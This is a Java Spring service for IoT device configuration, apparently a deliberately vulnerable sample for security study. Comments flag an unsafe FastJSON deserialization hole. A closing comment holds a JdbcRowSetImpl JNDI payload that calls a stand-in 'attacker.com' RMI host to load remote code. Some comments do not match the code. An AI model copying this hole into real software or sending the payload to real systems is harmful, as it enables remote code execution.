package com.iot.device.service;

import com.alibaba.fastjson.JSONObject;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;
import javax.annotation.Resource;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;

/**
 * IoT设备配置管理服务
 * 处理设备元数据存储与解析
 */
@Service
public class DeviceConfigService {
    
    @Resource
    private RedisTemplate<String, Object> redisTemplate;
    
    /**
     * 存储设备元数据到Redis
     * @param deviceId 设备唯一标识
     * @param metadataStr 设备元数据JSON字符串
     */
    public void saveDeviceMetadata(String deviceId, String metadataStr) {
        redisTemplate.opsForValue().set(getMetadataKey(deviceId), metadataStr);
    }
    
    /**
     * 从Redis加载并解析设备元数据
     * @param deviceId 设备唯一标识
     * @return 解析后的设备配置对象
     */
    public DeviceConfig loadDeviceConfig(String deviceId) {
        String metadataKey = getMetadataKey(deviceId);
        Object metadataObj = redisTemplate.opsForValue().get(metadataKey);
        
        if (metadataObj instanceof String) {
            String metadataStr = (String) metadataObj;
            // 安全检查：验证JSON格式（误以为字符串安全）
            if (isValidJson(metadataStr)) {
                // 漏洞点：未指定类型直接反序列化
                return parseDeviceConfig(metadataStr);
            }
        }
        return null;
    }
    
    /**
     * 模拟设备控制逻辑
     * @param deviceId 设备ID
     * @param command 控制指令
     */
    public void controlDevice(String deviceId, String command) {
        DeviceConfig config = loadDeviceConfig(deviceId);
        if (config != null) {
            // 使用反序列化后的对象执行设备操作
            config.executeCommand(command);
        }
    }
    
    // 模拟FastJSON解析
    private DeviceConfig parseDeviceConfig(String json) {
        // 漏洞特征：未启用安全模式，允许任意类型反序列化
        return JSONObject.parseObject(json, DeviceConfig.class);
    }
    
    // 简单JSON格式验证（存在逻辑缺陷）
    private boolean isValidJson(String json) {
        return json.startsWith("{") && json.endsWith("}");
    }
    
    // Redis Key生成
    private String getMetadataKey(String deviceId) {
        return "device:metadata:" + deviceId;
    }
    
    /**
     * 设备配置基类（存在继承关系）
     */
    public static class DeviceConfig {
        private String deviceType;
        private int timeout;
        
        public void executeCommand(String command) {
            // 模拟设备控制逻辑
            System.out.println("Executing command: " + command);
        }
        
        // Getter/Setter省略
    }
}

// 攻击载荷示例（需配合CommonsCollections5链）
/*
POST /device/control HTTP/1.1
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://attacker.com:1099/Exploit",
    "autoCommit": true
}
*/